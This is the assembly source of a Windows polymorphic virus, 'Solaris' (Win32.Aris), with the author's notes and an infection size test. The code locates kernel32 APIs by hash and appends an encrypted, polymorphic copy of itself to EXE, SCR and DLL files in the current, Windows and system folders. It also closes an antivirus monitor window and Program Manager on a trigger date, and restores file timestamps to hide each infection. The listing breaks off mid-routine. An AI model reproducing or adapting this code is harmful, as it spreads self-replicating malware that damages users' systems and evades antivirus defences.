
;
;  Solaris (AKA Win32.Aris)
;  coded by Bumblebee
;  ---------------------------------------------------------------------
;
;  Contents
;
;  1. Disclaimer
;  2. Introduction
;  3. Virus overview
;  4. BSEE review
;
;
;  [1] DISCLAIMER
;
;  This is the source code of a VIRUS. The author is not responsabile of
;  any damage that may occur due to the assembly of this file. Use it at
;  your own risk.
;
;
;  [2] INTRODUCTION
;
;  Each time i see Plage 2000 itw and i hear ppl like my  worms  i  feel
;  sad, coz those bugs didn't made me think at all. Them're kinda a  toy
;  i coded fast and easily. So i liked to code  something  complex  with
;  Solaris. Just to prove myself  i  can  do  other  things  but  worms.
;  My late viruses are kinda experimental and outta lab  them  won't  be
;  able to spread so far. So this is my way back to  the  bussiness  and
;  the so called *serious things*.
;  The name of this virus is a a lil tribute to  the  magician  of  hard
;  sci-fi, Stanislav Lem, and his great book Solaris. Just think  Ursula
;  Le Guin calls him master of imagination (together with J. L.  Borges,
;  another great monster).
;  Well, i suppose retarded avers will call it as it goes out from their
;  ass. Doesn't matter, let's call it Solaris :)
;  As well as the planet in the book, you won't be  able  to  understand
;  Solaris easily (at least i hope so).
;
;
;  [3] VIRUS OVERVIEW
;
;  It's a polymorphic win32 direct action PE infector that infects  EXE,
;  SCR and DLL files form current, windows and system folders.  Due  the
;  generated poly code it's very huge and its generation is complex  the
;  virus behavior has been setup for being a slow infector. It's  better
;  to have a slow infector than suddenly to have a  slow  computer.  The
;  generated poly code includes also the virus code  coz  the  virus  is
;  pushed into the stack and executed there. That's main reason it's not
;  a big virus, we cannot use too much  stack  (remember  DLL  are  also
;  infected by the virus, you should know the consequences).
;  Both poly engine and the fact it must be fully relocatable to  infect
;  DLLs is not easy task. DLL infection makes the virus able  to  spread
;  faster as many DLLs are infected. But again that makes the comp  slow
;  coz there are several virus instances working at the same time.  I've
;  used shared files by name to avoid that in a kinda  successfuly  way.
;  Even the virus has other features, eg. 2nd non-poly encryption layer,
;  its most interesting features come from the not usual poly engine and
;  the DLL infection (very annoying).
;
;  The source is full commented. I hope i've introduced Solaris.
;
;
;  [4] BSEE REVIEW
;
;  Here i include an host increased size review (BSEE with  Solaris test
;  version size 3420, final sample is about 4kbs):
;
;             target: ping.exe (OS Win98 4.10.1998)
;      original size: 28.672 bytes
;  object/file align: 1000h/1000h
;      virus padding: 101
;   samples infected: 52
;
;  Note: 1st gen infected 1st sample.  Sample  j  was  infected  by  j-1
;  sample.
;
;  Frequency tabulation for infected samples with RECLEVEL 6
;
;    size      freq.     Cu. freq.     increase
;  ----------------------------------------------
;   61.509      02          02          32.837
;   65.549      22          24          36.877
;   69.690      22          46          41.018
;   73.730      06          52          45.058
;  ----------------------------------------------
;      average final size: 68.093
;  average increased size: 39.417
;
;  We can see how median is very close to average. So even samples  have
;  variable size, that size fits in a normal distribution. Kewl test for
;  a random number generator :)
;  At one hand we have than PE aligment makes us lose some of the  sense
;  of the test, but at other hand since we will manage aligned files nor
;  true poly size... that fact doesn't matters for the test.
;  Gen codes have very variable size but due PE aligment issues we  only
;  see 4 different file sizes.
;
;
;                                                     The way of the bee
;
.486p
locals
jumps
.model flat,STDCALL

        extrn           ExitProcess:PROC        ; required for 1st gen
        extrn           MessageBoxA:PROC

; from BC++ Win32 API on-line Reference
WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

; about 1st gen:
; as you'll see i use lot of tricks to make 1st gen run. that's due
; the way the virus executes is quite *anti-natural*
; to sum up: 1st gen emulates the execution in the stack
; notice there is required the write attrib in the code section
; but in next generations it won't be necessary.

vSize           equ     vEnd-vBegin
PADDING         equ     101
MAXPATH         equ     160
RECLEVEL        equ     6                       ; poly engine's top
                                                ; recursive level
.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'
.CODE
inicio:
vBegin  label   byte
        jmp     setupVirus                      ; make some init
        nop                                     ; nops for size fit with
        nop                                     ; code to restore
        nop
        nop
        nop

;       Following code will be put instead jmp setupVirus and nops
;       after init process...
;
;       sub     esp,8
;       mov     esi,dword ptr [esp+vSize+28h]   ; get value from stack
                                                ; to guess K32 addr

        call    decrypt                         ; decrypt layer
rtdelta:
        jmp     beginEncLayer

decrypt:
        ; simple encryption layer
        mov     eax,12345678h
encKey  equ     $-4
        mov     edi,dword ptr [esp]
        sub     edi,offset rtdelta
        lea     edi,beginEncLayer+edi
        mov     ecx,(vEnd-beginEncLayer)/4
encodeLayer:
        xor     dword ptr [edi],eax
        sub     edi,-4
        loop    encodeLayer
        ret

beginEncLayer:
        call    getDelta                        ; get delta offset

        ; we have a great problem with relocatable code
        ; coz we cannot rely in relative jmps due we don't
        ; know where is running the virus (stack? tmp mem? uh?)
        ; and we cannot do standard trick of checking displacement
        ; of virus ep relative to calculated values at infection
        ; time due the same shit. So, what's the solution?
        ; we calc delta offset for host, pushing in the stack
        ; the addr of the jmp esp into the poly code ;)
        ; it's not simple at all, but works.
        ;

        mov     edx,dword ptr [esp]             ; get the ret addr
        sub     edx,dword ptr [esp+4h]          ; sub calculated addr
        ; reloc data will be calculated at infection time as:
        ; virus enc virt addr + virus encoded size + push size + call size
        add     dword ptr [hostEP+ebp],edx      ; fix host ep addr

        ; as result we can infect relocatable hosts ;)

        xor     edx,edx
        lea     eax,dword ptr [esp-8h]          ; setup SEH frame
        xchg    eax,dword ptr fs:[edx]
        call    pushExceptionCodeAddr

        xor     eax,eax                         ; restore all
        mov     eax,dword ptr fs:[eax]
        mov     esp,dword ptr [eax]

        xor     eax,eax                         ; and remove frame
        pop     dword ptr fs:[eax]
        pop     eax

        jmp     returnHost                      ; go back host

pushExceptionCodeAddr:
        push    eax

GetKernelLoop:                                  ; look for kernel32.dll
        cmp     word ptr [esi],'ZM'
        jne     GetKernel32NotFound
        mov     dx,word ptr [esi+3ch]
        cmp     esi,dword ptr [esi+edx+34h]
        je      GetKernel32Found

GetKernel32NotFound:
        dec     esi
        jmp     GetKernelLoop

GetKernel32Found:
        xor     eax,eax                         ; remove SEH
        pop     dword ptr fs:[eax]
        pop     eax        

        ; now get APIs using CRC32 (esi has k32 addr)
        mov     edi,esi
        mov     esi,dword ptr [esi+3ch]
        add     esi,edi
        mov     esi,dword ptr [esi+78h]
        add     esi,edi
        add     esi,1ch

        lodsd
        add     eax,edi
        mov     dword ptr [address+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [names+ebp],eax
        lodsd
        add     eax,edi
        mov     dword ptr [ordinals+ebp],eax

        sub     esi,16
        lodsd
        mov     dword ptr [nexports+ebp],eax

        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     eax,FSTAPI+ebp

searchl:
        mov     esi,dword ptr [names+ebp]
        add     esi,edx
        mov     esi,dword ptr [esi]
        add     esi,edi
        push    eax edx edi
        xor     edi,edi
        movzx   di,byte ptr [eax+4]
        call    CRC32
        xchg    ebx,eax
        pop     edi edx eax
        cmp     ebx,dword ptr [eax]
        je      fFound
        add     edx,4
        inc     dword ptr [expcount+ebp]
        push    edx
        mov     edx,dword ptr [expcount+ebp]
        cmp     dword ptr [nexports+ebp],edx
        pop     edx
        je      returnHost
        jmp     searchl
fFound:
        shr     edx,1
        add     edx,dword ptr [ordinals+ebp]
        xor     ebx,ebx
        mov     bx,word ptr [edx]
        shl     ebx,2
        add     ebx,dword ptr [address+ebp]
        mov     ecx,dword ptr [ebx]
        add     ecx,edi
        mov     dword ptr [eax+5],ecx
        add     eax,9
        xor     edx,edx
        mov     dword ptr [expcount+ebp],edx
        lea     ecx,ENDAPI+ebp
        cmp     eax,ecx
        jb      searchl

        ; API search done

        ; here follows a nice trick ;)
        ;
        ; this is a reentrance lock to avoid multiple
        ; instances of the virus running in the same process due:
        ;   - multithreading
        ;   - dll
        ;   - epo
        ;   - re-exec host (no really same process, but that's
        ;     not allowed due as side effect of the trick)
        ;
        ; i use the random object name generated at infection time
        ; to create a named file mapping object. the name is 10
        ; char long and contains only numbers: '0'...'9'
        ;
        ; that allows multiples instances of the virus, but not in
        ; the same process... in this way we avoid overload the process
        ; (eg. each virus instance allocs memory and the viral
        ; activity itself and ...) and problems due virus-in-host
        ; exclusive behavior
        ;
        xor     eax,eax
        lea     esi,fileMappingObj+ebp
        push    esi
        push    1024                            ; bah, size doesn't
        push    eax                             ; matter :) hehehe
        push    00000004h
        push    eax
        dec     eax
        push    eax
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      returnHost

        call    dword ptr [_GetLastError+ebp]
        cmp     eax,0b7h                        ; already executed?
        je      returnHost


        ; alloc some memory to build there the virus sample used
        ; to infect and to store the virus body sample that will be
        ; executed there...
        ; Alloc aproximation of virus required buffer
        push    00000004h
        push    00001000h OR 00002000h
        push    (vSize*2+vSize*3*RECLEVEL+MAXPATH*2)
                                                ; due the poly generated
        push    0h                              ; code is recursive i don't
        call    dword ptr [_VirtualAlloc+ebp]   ; know 100% the max size
        or      eax,eax                         ; (and i'm lazy to look for
        jz      returnHost                      ; worst case)

        mov     dword ptr [virusSample+ebp],eax

        ; fix the return host addr to be used in memory
        mov     edx,dword ptr [hostEP+ebp]
        mov     dword ptr [inMemH+ebp],edx

        cld
        lea     esi,vBegin+ebp                  ; copy virus to tmp mem
        mov     edi,eax
        mov     ecx,vSize
        rep     movsb

        add     eax,inMemory-vBegin
        push    eax
        ret                                     ; goto mem copy

returnHost:                                     ; return control to host
        add     esp,vSize+8                     ; fix stack
        popad
        push    offset fakeHost                 ; saved host EP
hostEP  equ     $-4
        ret

inMemory:
        add     esp,vSize+8                     ; fix stack
        popad
        push    12345678h
inMemH  equ     $-4
        pushad
        ; here we are running in tmp memory
        ; and we've fixed the stack. From here to end of virus
        ; we cannot jmp returnHost. Use IMReturnHost instead.
        ; the return address of the host with relocation fix
        ; is yet in the stack so a simple ret will bring us back host

        call    getDelta                        ; get delta offset again

        ; get non k32 apis

        ; 1st load IMGAGEHLP.DLL
        xor     eax,eax
        mov     dword ptr [_CheckSumMappedFile+ebp],eax
        lea     eax,imagehlpdllStr+ebp
        push    eax
        call    dword ptr [_LoadLibraryA+ebp]
        mov     dword ptr [imagehlpdllHnd+ebp],eax
        or      eax,eax
        jz      imagehlpdllError

        ; get API for updating PE checksum
        lea     esi,CheckSumMappedFileStr+ebp
        push    esi
        push    eax
        call    dword ptr [_GetProcAddress+ebp]
        mov     dword ptr [_CheckSumMappedFile+ebp],eax
imagehlpdllError:

        ; 2nd load SFC.DLL
        xor     eax,eax
        mov     dword ptr [_SfcIsFileProtected+ebp],eax
        lea     eax,sfcdllStr+ebp
        push    eax
        call    dword ptr [_LoadLibraryA+ebp]
        mov     dword ptr [sfcdllHnd+ebp],eax
        or      eax,eax
        jz      sfcdllError

        ; get API for avoid infect SFC protected files
        lea     esi,SfcIsFileProtectedStr+ebp
        push    esi
        push    eax
        call    dword ptr [_GetProcAddress+ebp]
        mov     dword ptr [_SfcIsFileProtected+ebp],eax
sfcdllError:

        ; 3rd load USER32.DLL
        lea     eax,user32dllStr+ebp
        push    eax
        call    dword ptr [_LoadLibraryA+ebp]
        or      eax,eax
        jz      user32dllError

        mov     dword ptr [user32dllHnd+ebp],eax

        ; get API needed for payload (and to fuck avp monitor)
        lea     esi,FindWindowAStr+ebp
        push    esi
        push    eax
        call    dword ptr [_GetProcAddress+ebp]
        or      eax,eax
        jz      user32dllErrorFree
        mov     dword ptr [_FindWindowA+ebp],eax

        lea     esi,PostMessageAStr+ebp
        push    esi
        push    dword ptr [user32dllHnd+ebp]
        call    dword ptr [_GetProcAddress+ebp]
        or      eax,eax
        jz      user32dllErrorFree
        mov     dword ptr [_PostMessageA+ebp],eax

        ; check payload activation
        lea     eax,fileTime0+ebp
        push    eax
        call    dword ptr [_GetSystemTime+ebp]

        lea     esi,fileTime0+ebp
        mov     ax,word ptr [esi+2]
        mov     dx,-1
month           equ     $-2
        cmp     dx,ax                           ; right month?
        jne     skipPayload

        mov     ax,word ptr [esi+4]
        mov     dx,-1
dayOfWeek       equ     $-2
        cmp     dx,ax                           ; right day of week?
        jne     skipPayload

        lea     esi,payloadStr+ebp              ; well, close program
        jmp     disableMON                      ; manager ;)
        ; it's really harmless, only annoying you won't
        ; be able to use Program Manager for about 4 days
        ; in a month... hehehe

        ; ok, just update payload values for next infections
skipPayload:
        mov     ax,word ptr [esi+4]
        mov     word ptr [dayOfWeek+ebp],ax     ; same day
        mov     ax,word ptr [esi+2]             ; wait 6 months
        add     ax,6                            ; to trigger
        cmp     ax,12
        jbe     notFixMonth
        sub     ax,12

notFixMonth:
        mov     word ptr [month+ebp],ax

        ; if today is not the party, just try to close avp
        ; monitor usign its window's name
        lea     esi,avStr+ebp
disableMON:
        push    esi
        xor     eax,eax
        push    eax
        call    dword ptr [_FindWindowA+ebp]
        or      eax,eax
        jz      user32dllErrorFree

        mov     edx,eax
        xor     eax,eax
        push    eax
        push    eax
        push    00000012h
        push    edx
        call    dword ptr [_PostMessageA+ebp]

user32dllErrorFree:
        push    dword ptr [user32dllHnd+ebp]
        call    dword ptr [_FreeLibrary+ebp]
user32dllError:

        ; setup seed of random number generator
        call    randomize

        ; setup path buffers
        mov     eax,dword ptr [virusSample+ebp]
        add     eax,(vSize*2+vSize*3*RECLEVEL)
        mov     dword ptr [path0+ebp],eax
        add     eax,MAXPATH
        mov     dword ptr [path1+ebp],eax

        mov     byte ptr [infCount+ebp],3       ; infect 3 files
        call    scanFolder
                                                ; get current directory
        push    dword ptr [path0+ebp]
        push    MAXPATH
        call    dword ptr [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      IMReturnHost

        push    MAXPATH                         ; get windows directory
        push    dword ptr [path1+ebp]
        call    dword ptr [_GetWindowsDirectoryA+ebp]
        or      eax,eax
        jz      IMReturnHost
                                                ; goto windows directory
        push    dword ptr [path1+ebp]
        call    dword ptr [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      IMReturnHost

        mov     byte ptr [infCount+ebp],2       ; infect 2 files
        call    scanFolder

        push    MAXPATH                         ; get system directory
        push    dword ptr [path1+ebp]
        call    dword ptr [_GetSystemDirectoryA+ebp]
        or      eax,eax
        jz      goHomeDir
                                                ; goto system directory
        push    dword ptr [path1+ebp]
        call    dword ptr [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      goHomeDir

        mov     byte ptr [infCount+ebp],5       ; infect 5 files
        call    scanFolder

goHomeDir:
                                                ; go home directory
        push    dword ptr [path0+ebp]
        call    dword ptr [_SetCurrentDirectoryA+ebp]

IMReturnHost:
        ; free non k32 dlls

        ; free IMAGEHLP.DLL
        mov     eax,dword ptr [imagehlpdllHnd+ebp]
        or      eax,eax
        jz      imagehlpdllFreed

        push    eax
        call    dword ptr [_FreeLibrary+ebp]

imagehlpdllFreed:

        ; free SFL.DLL
        mov     eax,dword ptr [sfcdllHnd+ebp]
        or      eax,eax
        jz      sfcdllFreed

        push    eax
        call    dword ptr [_FreeLibrary+ebp]

sfcdllFreed:

        popad
        ret

;
; Scan current folder for EXE, SCR and DLL files suitable for infect
;
; Why not to infect CPL files?
;
; 1. Them doesn't go any plaze, and for system prevaleance we have
;    SCR, EXE and DLL.
; 2. CPL are strange DLL that sometimes play with 16 bits shit. Take
;    as example desk.cpl under win9x: it's infection is quite unestable.
;
; Notice DLL is its main way for spreading, indeed all features of a
; direct action infector are also available.
;
scanFolder:
        pushad

        lea     eax,find_data+ebp
        push    eax
        lea     eax,fndMask+ebp
        push    eax
        call    dword ptr [_FindFirstFileA+ebp]
        inc     eax
        jz      notFound
        dec     eax

        mov     dword ptr [findHnd+ebp],eax

findNext:
        ; avoid hugah files
        mov     eax,dword ptr [find_data.nFileSizeHigh+ebp]
        or      eax,eax
        jnz     skipThisFile

        ; check size padding
        mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        or      edx,edx                         ; reminder is zero?
        jz      skipThisFile

        lea     esi,find_data.cFileName+ebp

        ; get extension
lookEndStr:
        inc     esi
        cmp     byte ptr [esi],0
        jne     lookEndStr

        ; skip shit
        cmp     byte ptr [esi-1],'"'
        jne     notShitInFilename
        dec     esi
notShitInFilename:
        mov     eax,dword ptr [esi-4]
        mov     dword ptr [tmpExt+ebp],eax

        ; make ext upper case
        lea     esi,tmpExt+ebp
        mov     ecx,4
upCaseLoop:
        cmp     byte ptr [esi],'a'
        jb      notChangeLetter
        cmp     byte ptr [esi],'z'
        ja      notChangeLetter
        sub     byte ptr [esi],'a'-'A'
notChangeLetter:
        inc     esi
        loop    upCaseLoop

        mov     eax,dword ptr [tmpExt+ebp]
        not     eax

        ; check has a valid extension
        cmp     eax,NOT 'LLD.'
        je      validExt
        cmp     eax,NOT 'EXE.'
        je      validExt
        cmp     eax,NOT 'RCS.'
        jne     skipThisFile

validExt:
        ; try to infect it
        lea     esi,find_data.cFileName+ebp
        call    infect

        ; reached max infections?
        cmp     byte ptr [infCount+ebp],0
        je      endScan

skipThisFile:
        lea     eax,find_data+ebp
        push    eax
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindNextFileA+ebp]
        or      eax,eax
        jnz     findNext

endScan:
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindClose+ebp]

notFound:
        popad
        ret

;
; in: esi filename to infect (not save regs)
;
infect:
        pushad

        ; check if SFC is available
        mov     eax,dword ptr [_SfcIsFileProtected+ebp]
        or      eax,eax
        jz      nonSfcProtectedFile

        push    esi                             ; save filename
        xor     eax,eax
        push    esi
        push    eax
        call    dword ptr [_SfcIsFileProtected+ebp]
        pop     esi                             ; restore filename
        or      eax,eax
        jz      nonSfcProtectedFile
        jmp     infectionError
nonSfcProtectedFile:

        push    esi                             ; save filename
        push    esi
        call    dword ptr [_GetFileAttributesA+ebp]
        pop     esi                             ; restore filename
        inc     eax
        jz      infectionError
        dec     eax

        mov     dword ptr [fileAttrib+ebp],eax  ; save attributes

        push    esi                             ; save filename
        push    00000080h                       ; clear file attributes
        push    esi
        call    dword ptr [_SetFileAttributesA+ebp]
        pop     esi                             ; restore filename
        or      eax,eax
        jz      infectionError

        push    esi                             ; save filename

        xor     eax,eax
        push    eax
        push    00000080h
        push    00000003h
        push    eax
        push    eax
        push    80000000h OR 40000000h
        push    esi
        call    dword ptr [_CreateFileA+ebp]    ; open file
        inc     eax
        jz      infectionErrorAttrib
        dec     eax

        mov     dword ptr [fHnd+ebp],eax        ; save handle

        push    0h
        push    eax
        call    dword ptr [_GetFileSize+ebp]    ; get filesize
        inc     eax
        jz      infectionErrorClose
        dec     eax

        mov     dword ptr [fileSize+ebp],eax

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_GetFileTime+ebp]    ; get file date/time
        or      eax,eax
        jz      infectionErrorClose

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]            ; create a file map obj
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax       ; save handle

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]  ; map a view for the obj
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax      ; save addr

        mov     edi,eax
        cmp     word ptr [edi],'ZM'             ; check exe
        jne     infectionErrorCloseUnmap

        cmp     dword ptr [edi+18h],3ah         ; check PE sign
        jb      infectionErrorCloseUnmap
        add     edi,dword ptr [edi+3ch]
        cmp     word ptr [edi],'EP'
        jne     infectionErrorCloseUnmap

        movzx   edx,word ptr [edi+16h]          ; check executable
        test    edx,2h
        jz      infectionErrorCloseUnmap

        ; if we failed to get the API to update pe checksum just
        ; avoid infect dll files
        mov     eax,dword ptr [_CheckSumMappedFile+ebp]
        or      eax,eax
        jnz     dllAreOk
        test    edx,2000h                       ; check not DLL
        jnz     infectionErrorCloseUnmap

dllAreOk:
        movzx   edx,word ptr [edi+5ch]
        dec     edx                             ; check not native
        jz      infectionErrorCloseUnmap

        cmp     word ptr [edi+1ch],0            ; has code? that's important
        je      infectionErrorCloseUnmap        ; remember dll with only
                                                ; resources

        mov     esi,edi                         ; save begin PE hdr
        mov     eax,18h
        add     ax,word ptr [edi+14h]
        add     edi,eax                         ; goto 1st section

        mov     cx,word ptr [esi+06h]           ; now to last sect
        dec     cx
        mov     eax,28h
        mul     cx
        add     edi,eax

        mov     ecx,dword ptr [edi+14h]         ; phys offset
        add     ecx,dword ptr [edi+10h]         ; phys size        

        cmp     ecx,dword ptr [fileSize+ebp]    ; avoid not nice files
        jne     infectionErrorCloseUnmap        ; also avoid reinfect files

        ; following code has no sense with READ attrib only required
        ; in last section. we rely in size padding.
        ;
        ; check sect properties to see if probably infected yet
        ; mov     eax,dword ptr [edi+24h]
        ; and     eax,00000020h OR 20000000h OR 40000000h
        ; cmp     eax,00000020h OR 20000000h OR 40000000h
        ; je      infectionErrorCloseUnmap

        mov     eax,dword ptr [edi+0ch]         ; sect RVA
        add     eax,dword ptr [edi+10h]         ; phys size
        xchg    eax,dword ptr [esi+28h]         ; put ep and get old
        add     eax,dword ptr [esi+34h]         ; add image base
        mov     dword ptr [hostEP+ebp],eax      ; save it

        xor     eax,eax
        mov     dword ptr [esi+58h],eax         ; zero PE checksum
                                                ; will be updated later
                                                ; if all goes fine
        ; usually: CODE, EXECUTE and READ
        ; or      dword ptr [edi+24h],00000020h OR 20000000h OR 40000000h

        ; only READ flag needed (CODE and EXEC are not required)
        or      dword ptr [edi+24h],40000000h
        ; not discardable and not shareable
        and     dword ptr [edi+24h],NOT (02000000h OR 10000000h)

        ; create a virus sample for this host
        mov     eax,dword ptr [esi+28h]
        add     eax,dword ptr [esi+34h]
        push    eax                             ; virus ep
        call    infectionSample

        mov     dword ptr [genSize+ebp],eax     ; save encoded size
        push    dword ptr [fileSize+ebp]        ; save old file size

        ; eax has encoded size
        mov     edx,dword ptr [edi+10h]
        sub     dword ptr [fileSize+ebp],edx    ; sub old phys size
        add     eax,dword ptr [edi+10h]         ; calc new sect phys size
        mov     ecx,dword ptr [esi+3ch]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     dword ptr [edi+10h],eax
        add     dword ptr [fileSize+ebp],eax    ; add new phys size

        add     eax,dword ptr [edi+0ch]         ; calc new image size
        mov     ecx,dword ptr [esi+38h]
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     dword ptr [esi+50h],eax
        sub     eax,dword ptr [edi+0ch]         ; sub sect RVA
        mov     dword ptr [edi+08h],eax         ; save sect new virt size

        ; now calc padding
        mov     eax,dword ptr [fileSize+ebp]
        mov     ecx,PADDING
        xor     edx,edx
        div     ecx
        inc     eax
        mul     ecx
        mov     dword ptr [padding+ebp],eax     ; save new file size with
                                                ; padding added

        pop     dword ptr [ofileSize+ebp]       ; get old file size

        ; now make file grow
        push    dword ptr [mapMem+ebp]
        call    dword ptr [_UnmapViewOfFile+ebp]

        push    dword ptr [fhmap+ebp]
        call    dword ptr [_CloseHandle+ebp]

        xor     eax,eax
        push    eax
        push    dword ptr [padding+ebp]
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [fHnd+ebp]
        call    dword ptr [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      infectionErrorClose

        mov     dword ptr [fhmap+ebp],eax

        xor     eax,eax
        push    dword ptr [padding+ebp]
        push    eax
        push    eax
        push    00000004h OR 00000002h
        push    dword ptr [fhmap+ebp]
        call    dword ptr [_MapViewOfFile+ebp]
        or      eax,eax
        jz      infectionErrorCloseMap

        mov     dword ptr [mapMem+ebp],eax

        ; end the infection process just adding virus body
        mov     ecx,dword ptr [genSize+ebp]
        mov     esi,dword ptr [virusSample+ebp]
        add     esi,vSize*2
        mov     edi,eax
        add     edi,dword ptr [ofileSize+ebp]
        rep     movsb

        mov     ecx,dword ptr [padding+ebp]     ; fill padding with
        sub     ecx,dword ptr [ofileSize+ebp]   ; zeroes
        sub     ecx,dword ptr [genSize+ebp]
        xor     eax,eax
        rep     stosb

        mov     eax,dword ptr [_CheckSumMappedFile+ebp]
        or      eax,eax
        jz      skipCheckSumUpdate

        lea     eax,nchksum+ebp
        push    eax
        lea     eax,ochksum+ebp
        push    eax
        push    dword ptr [padding+ebp]
        push    dword ptr [mapMem+ebp]
        call    dword ptr [_CheckSumMappedFile+ebp]
        or      eax,eax
        jz      skipCheckSumUpdate

        mov     edx,dword ptr [nchksum+ebp]     ; update checksum
        mov     dword ptr [eax+58h],edx

skipCheckSumUpdate:
        dec     byte ptr [infCount+ebp]         ; another infection

infectionErrorCloseUnmap:
        push    dword ptr [mapMem+ebp]          ; unmap view
        call    dword ptr [_UnmapViewOfFile+ebp]

infectionErrorCloseMap:
        push    dword ptr [fhmap+ebp]           ; close map file obj
        call    dword ptr [_CloseHandle+ebp]

        lea     edi,fileTime2+ebp
        push    edi
        lea     edi,fileTime1+ebp
        push    edi
        lea     edi,fileTime0+ebp
        push    edi
        push    dword ptr [fHnd+ebp]            ; restore date/time
        call    dword ptr [_SetFileTime+ebp]

infectionErrorClose:
        push    dword ptr [fHnd+ebp]            ; close file
        call    dword ptr [_CloseHandle+ebp]

infectionErrorAttrib:
        pop     esi                             ; restore filename
        push    dword ptr [fileAttrib+ebp]
        push    esi                             ; restore attributes
        call    dword ptr [_SetFileAttributesA+ebp]

infectionError:
        popad
        ret

;
;  DWORD infectionSample(DWORD push_val) (save regs)
;
;  push_val: enc virus virt addr (virus ep)
;  it's required to setup the push used for relocation stuff
;  returns gen size
;
infectionSample:
        push    eax
        pushad

        ; get a new crypt key
anotherKey:
        push    0ffffffffh
        call    rndInRange
        or      eax,eax
        jz      anotherKey

        mov     dword ptr [encKey+ebp],eax

        ; gen a random filemapping Object name
        lea     esi,fileMappingObj+ebp
        mov     ecx,10
        mov     edi,ecx
getFileMappingObjName:
        mov     eax,10
        push    eax
        call    rndInRange
        add     al,'0'
        cmp     edi,eax                         ; ok, i rely in the rnd
        je      getFileMappingObjName           ; generator, but... hehe
        mov     edi,eax
        mov     byte ptr [esi],al
        inc     esi
        loop    getFileMappingObjName

        ; copy virus
        lea     esi,vBegin+ebp
        mov     edi,esi
        add     edi,vSize
        push    edi
        mov     ecx,vSize
        rep     movsb

        ; encrypt it
        pop     edi
        mov     eax,dword ptr [encKey+ebp]
        add     edi,beginEncLayer-vBegin
        mov     ecx,(vEnd-beginEncLayer)/4
        call    encodeLayer

        ; now encode the virus
        mov     eax,dword ptr [virusSample+ebp]
        add     eax,vSize*2
        push    eax                             ; save begin of env vir
        push    eax
        call    encodeVirus
        mov     dword ptr [genSize+ebp],eax     ; save enc vir size

        pop     edi                             ; restore begin enc vir
        add     edi,eax                         ; begin of jmp code

                                                ; setup push for reloc stuff
                                                ; encoded vir size
        add     eax,dword ptr [esp+28h]         ; push_val
        push    eax                             ; save it

        call    GetReg                          ; get rnd reg
                                                ; get push reloc (bad)
        pop     edx                             ; mov reg32,imm32
        push    edi                             ; need to calc size
        mov     cl,al
        push    ecx
        call    AddMovREGIMM

        pop     ecx                             ; push reg32
        push    eax
        call    AddPushREG

        pop     eax                             ; free the reg
        call    FreeReg

        pop     edx
        mov     ebx,edi
        sub     ebx,edx
        add     ebx,5
        add     dword ptr [edx+1],ebx           ; fix push reloc (good)
        push    ebx                             ; save size

        mov     al,0e8h                         ; call
        stosb
        xor     eax,eax
        stosd

        push    edi                             ; we need calc size again

        ;
        ; now we need to sub 8 to esp, do it poly
        ;
        mov     eax,12                          ; get random reg
        push    eax
        call    rndInRange

        cmp     eax,_ESP                        ; skip esp reg
        jne     notFixRndReg0
        inc     eax
notFixRndReg0:

        cmp     eax,8                           ; case reg 8,9,10,11
        jb      addPops0                        ; it's spezial:
        mov     al,83h                          ; sub esp,8
        stosb
        mov     ax,08c4h
        stosw
        jmp     doneStack
addPops0:
        mov     cl,al        
        call    AddPopREG                       ; add 1 pop reg32

        mov     eax,14                          ; get random reg
        push    eax
        call    rndInRange

        cmp     eax,_ESP                        ; skip esp reg
        jne     notFixRndReg1
        inc     eax
notFixRndReg1:

        cmp     eax,8                           ; 8,9,10,11,12,13 reg:
        jb      addPops1                        ; sub esp,4
        mov     al,83h
        stosb
        mov     ax,04c4h
        stosw
        jmp     doneStack
addPops1:
        mov     cl,al
        call    AddPopREG                       ; add 1 pop reg32

doneStack:
        mov     ax,0e4ffh                       ; jmp esp
        stosw

        pop     edx                             ; get old ptr pos
        mov     ebx,edi
        sub     ebx,edx                         ; cal new size
        pop     edx                             ; get old size
        add     edx,ebx                         ; total added size
        add     edx,dword ptr [genSize+ebp]     ; plus encoded size

        mov     dword ptr [esp+20h],edx
        popad
        pop     eax
        retn    4
;
; DWORD randomize(VOID) (not save regs)
;
randomize:
        call    dword ptr [_GetTickCount+ebp]
        imul    eax,0C6EF3720h
        add     dword ptr [rseed+ebp],eax
        ret
;
; DWORD rndInRange(DWORD range) (save regs)
;
rndInRange:
        push    eax
        pushad
        mov     eax,87654321h
rseed   equ     $-4
        imul    eax,9E3779B9h
        shr     eax, 16
        add     dword ptr [rseed+ebp],eax
        lea     esi,rseed+ebp
        mov     edi,4
